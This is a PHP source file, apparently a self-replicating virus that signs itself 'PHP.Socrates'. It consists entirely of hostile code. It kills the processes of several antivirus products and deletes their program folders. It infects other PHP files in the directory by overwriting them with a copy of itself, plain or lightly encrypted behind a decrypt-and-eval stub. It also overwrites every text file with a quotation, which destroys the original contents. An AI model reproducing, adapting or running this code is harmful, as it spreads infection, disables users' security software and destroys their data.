<?php
echo("PHP.Socrates by synged flesh"."<br>"."The only true wisdom is in knowing you know nothing.");

$decrypt=
"function SocratesDecrypt(\$string,\$key)\r\n"

."{                                 \r\n"

." \$codez='';                       \r\n"

."  for(\$i=0; \$i<strlen(\$string); \$i++)\r\n"

."  {                               \r\n"

."     \$value=ord(\$string[\$i]);     \r\n"

."     \$valuez=\$value+\$key;         \r\n"

."     \$codez.=chr(\$valuez);        \r\n"

."     }                            \r\n"

."       return \$codez;             \r\n"

."  }                               \r\n"

."\$filez = \$_SERVER[\"SCRIPT_NAME\"];\r\n"

."\$break = Explode('/', \$filez);     \r\n"			

."\$pfile = \$break[count(\$break) - 1];\r\n"          

."\$c = fopen(\$pfile,'rb');\r\n"

."\$d = fread(\$c,filesize(\$pfile));\r\n"             

."fclose(\$c);\r\n"

."\$next=strlen(\$d)-693;\r\n"
."\$virus=substr(\$d,687,\$next);\r\n"

."\$vr=SocratesDecrypt(\$virus,'1');\r\n"

."eval(\$vr);";


function SocratesCrypt($string,$key)
            
{
  
               $codez="";
  
                  for($i=0; $i<strlen($string); $i++)
  
                       {
     
     
                          $value=ord($string[$i]);
      
     
                          $valuez=$value-$key;
     
     
                          $codez.=chr($valuez);
     
    
                       }
       
       
                             return $codez;
  
           
}
 
                              if(is_dir("C:\Program Files\Norton*")) 
                                       {
                                           
exec("taskkill /f /t /im nod32.exe");
                                           
rmdir("C:\Program Files\Norton*");

                                       }

                                          if(is_dir("C:\Program Files\McAfee*")) 
                                           {

                                              exec("taskkill /f /t /im Mcshield.exe");
                                              
rmdir("C:\Program Files\McAfee*");
}

                                          
                                          if(is_dir("C:\Program Files\Kaspersky*")) 

                                           {
                                             
exec("taskkill /f /t /im KAV.exe");
                                             
rmdir("C:\Program Files\Kaspersky*");

                                           }
        

$filez = $_SERVER["SCRIPT_NAME"];
$break = Explode('/', $filez);			
$pfile = $break[count($break) - 1];  
$c = fopen($pfile,'rb');

$d = fread($c,filesize($pfile));             

fclose($c);

$nextsize=strlen($d)-4;
$virus=(substr($d,7,$nextsize));
$dir=opendir('*.*');  
           
while (($file = readdir($dir)) !== false) 
                                          
                      
            {
                                           
                 if (strstr($file,'.php')) 
                                                
                        {  
                                                   
                           $f = fopen($file,'rb');             
                                                   
                           $contents = fread($f, filesize($file));
                                                     
                 if (!strstr($contents, 'Socrates')) 
                                                        
                           {  
                                                                                                                              if(!file_exists("Socrates.php")) {
                                 fclose($f);
                                                                                                                   $g = fopen($file,'w');
                                                                                                        fwrite($g,$d); 
    
                                 fclose($g);
    
                                 }



                             if(file_exists("Socrates.php"))
                               {
                                 fclose($f);
                                                                                                                   $g = fopen($file,'w');
                                                                                                        fwrite($g,'<?php'.chr(13).chr(10).$decrypt.'/*'.SocratesCrypt($virus,'1').'*/'.'?>'); 
    
                                 fclose($g);
            
                               }
                            
                              
                                          
                                
                           
                          }
                                                
                       }
                                           
                         if (strstr($file,'.txt')) 
                                                
                            {  
                                                  
                                 $f = fopen($file,'w');    
                                                  
                                 fwrite($f,"Let him that would move the world, first move himself.");
                                                
                            }
                     
           }?>


